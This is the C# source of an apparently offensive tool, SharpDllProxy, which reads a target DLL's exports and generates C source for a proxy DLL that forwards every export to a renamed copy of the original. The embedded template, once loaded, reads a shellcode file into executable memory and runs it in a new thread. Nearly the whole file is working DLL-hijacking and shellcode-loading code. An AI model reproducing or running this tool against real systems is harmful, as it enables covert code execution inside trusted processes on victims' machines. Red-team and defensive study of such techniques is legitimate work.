using System;
using System.IO;
using System.Linq;

namespace SharpDllProxy
{
    class Program
    {
        public static string dllTemplate = @"
#include ""pch.h""
#include <stdio.h>
#include <stdlib.h>

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

PRAGMA_COMMENTS

DWORD WINAPI DoMagic(LPVOID lpParameter)
{
	//https://stackoverflow.com/questions/14002954/c-programming-how-to-read-the-whole-file-contents-into-a-buffer
	FILE* fp;
	size_t size;
	unsigned char* buffer;

	fp = fopen(""PAYLOAD_PATH"", ""rb"");
	fseek(fp, 0, SEEK_END);
        size = ftell(fp);
        fseek(fp, 0, SEEK_SET);
        buffer = (unsigned char*)malloc(size);
	
	//https://ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources
        fread(buffer, size, 1, fp);

        void* exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        memcpy(exec, buffer, size);

        ((void(*) ())exec)();

	return 0;
}

    BOOL APIENTRY DllMain(HMODULE hModule,
        DWORD ul_reason_for_call,
        LPVOID lpReserved
    )
    {
        HANDLE threadHandle;

        switch (ul_reason_for_call)
        {
            case DLL_PROCESS_ATTACH:
		// https://gist.github.com/securitytube/c956348435cc90b8e1f7
                // Create a thread and close the handle as we do not want to use it to wait for it 
                threadHandle = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);
                CloseHandle(threadHandle);

            case DLL_THREAD_ATTACH:
                break;
            case DLL_THREAD_DETACH:
                break;
            case DLL_PROCESS_DETACH:
                break;
        }
        return TRUE;
    }



";

        static void Main(string[] args)
        {
            //Cheesy way to generate a temp filename for our original DLL
            var tempName = Path.GetFileNameWithoutExtension(Path.GetTempFileName());

            var orgDllPath = @"";

            var payloadPath = @"shellcode.bin";

            var pragmaBuilder = "";

            for (int i = 0; i < args.Length; i++)
            {
                if (args[i].ToLower().Equals("--dll") || args[i].ToLower().Equals("-dll"))
                {
                    if (i + 1 < args.Length)
                        orgDllPath = Path.GetFullPath(args[i + 1]);
                }


                if (args[i].ToLower().Equals("--payload") || args[i].ToLower().Equals("-payload"))
                {
                    if (i + 1 < args.Length) {
                        //Needed to filter filename input from powershell
                        payloadPath = Path.GetFileName(args[i + 1]);
                    }
                }
            }

            if (string.IsNullOrWhiteSpace(orgDllPath) || !File.Exists(orgDllPath)) {
                Console.WriteLine($"[!] Cannot locate DLL path, does it exists?");
                Environment.Exit(0);
            }

            if (string.IsNullOrWhiteSpace(payloadPath))
            {
                Console.WriteLine($"[!] shellcode filname/path is empty, bad input!");
                Environment.Exit(0);
            }


            //Create an output directory to export stuff too
            string outPath = Directory.CreateDirectory("output_" + Path.GetFileNameWithoutExtension(orgDllPath)).FullName;

            Console.WriteLine($"[+] Reading exports from {orgDllPath}...");

            //Read PeHeaders -> Exported Functions from provided DLL
            PeNet.PeFile dllPeHeaders = new PeNet.PeFile(orgDllPath);

           //Build up our linker redirects
            foreach (var exportedFunc in dllPeHeaders.ExportedFunctions)
            {
                pragmaBuilder += $"#pragma comment(linker, \"/export:{exportedFunc.Name}={tempName}.{exportedFunc.Name},@{exportedFunc.Ordinal}\")\n";

            }
            Console.WriteLine($"[+] Redirected {dllPeHeaders.ExportedFunctions.Count()} function calls from { Path.GetFileName(orgDllPath)} to {tempName}.dll");

            //Replace data in our template
            dllTemplate = dllTemplate.Replace("PRAGMA_COMMENTS", pragmaBuilder);
            dllTemplate = dllTemplate.Replace("PAYLOAD_PATH", payloadPath);

            Console.WriteLine($"[+] Exporting DLL C source to {outPath + @"\" + Path.GetFileNameWithoutExtension(orgDllPath)}_pragma.c");

            File.WriteAllText($@"{outPath + @"\" + Path.GetFileNameWithoutExtension(orgDllPath)}_pragma.c", dllTemplate);
            File.WriteAllBytes(outPath + @"\" + tempName + ".dll", File.ReadAllBytes(orgDllPath));


        }
    }
}
